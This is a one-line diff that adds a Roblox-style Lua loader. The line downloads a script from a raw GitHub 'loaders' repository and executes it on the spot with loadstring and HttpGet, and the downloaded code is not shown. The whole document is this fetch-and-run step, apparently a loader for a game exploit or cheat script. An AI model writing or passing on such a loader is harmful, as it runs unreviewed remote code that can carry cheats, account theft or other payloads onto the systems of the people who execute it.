@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/rainy-valley-spam1-lpd5n2wmg03t47.lua"))()
